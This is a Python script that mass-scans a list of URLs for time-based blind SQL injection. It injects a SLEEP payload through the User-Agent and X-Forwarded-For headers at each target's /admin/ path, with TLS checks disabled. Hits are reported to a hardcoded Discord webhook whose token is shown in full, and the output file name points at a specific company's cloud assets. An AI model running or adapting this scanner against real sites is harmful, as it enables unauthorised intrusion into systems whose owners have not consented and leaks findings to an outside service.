import requests
import argparse
import time
import urllib3
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1349097606709510328/OAvRLvmJcUjqpR6Ruzh_quEaN4OeIwXtLXz2fv5i1Fy9FMSdfJq4NDfAC6lKqNR3b2LU"

payload = 'nvn"xor(if(now()=sysdate(),SLEEP(6),0))xor"nvn'
headers_template = {
    "User-Agent": payload,
    "X-Forwarded-For": payload,
    "X-Client-IP": payload,
    "X-Requested-With": "XMLHttpRequest",
    "Accept": "*/*"
}

def send_discord_alert(url):
    if DISCORD_WEBHOOK:
        try:
            json_data = {
                "content": f"🚨 **SQLi Vulnerable**: `{url}`"
            }
            requests.post(DISCORD_WEBHOOK, json=json_data)
        except Exception as e:
            print(f"{Fore.YELLOW}[!!] Discord alert failed: {e}{Style.RESET_ALL}")

def is_vulnerable(url):
    try:
        start = time.time()
        response = requests.get(f"{url}/admin/", headers=headers_template, timeout=10, verify=False)
        duration = time.time() - start
        status = response.status_code
        return duration > 5.5, status
    except requests.exceptions.RequestException as e:
        return False, None

def main(file_path):
    with open(file_path, 'r') as f:
        urls = [line.strip() for line in f if line.strip()]

    print(f"\n[+] Loaded {len(urls)} targets. Starting scan...\n")
    vulnerable = []

    for idx, url in enumerate(urls, 1):
        print(f"[{idx}/{len(urls)}] Testing: {url}")
        result, status = is_vulnerable(url)

        if result:
            print(f"  {Fore.GREEN}[!!] Vulnerable: {url} | Status: {status}{Style.RESET_ALL}")
            vulnerable.append(url)
            send_discord_alert(url)
        else:
            color = Fore.RED if status else Fore.YELLOW
            print(f"  {color}[--] Not vulnerable | Status: {status if status else 'Error/Timeout'}{Style.RESET_ALL}")
        
        time.sleep(3)

    if vulnerable:
        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        out_file = f"vulnerable_bmwcloud_{timestamp}.txt"
        with open(out_file, "w") as out:
            for v in vulnerable:
                out.write(v + "\n")
        print(f"\n[+] Exported {len(vulnerable)} vulnerable URLs to {out_file}\n")
    else:
        print("\n[-] No vulnerable targets found.\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Test cloud assets for SQLi via headers.")
    parser.add_argument("-f", "--file", required=True, help="File containing list of URLs (https://example.com)")
    args = parser.parse_args()
    main(args.file)
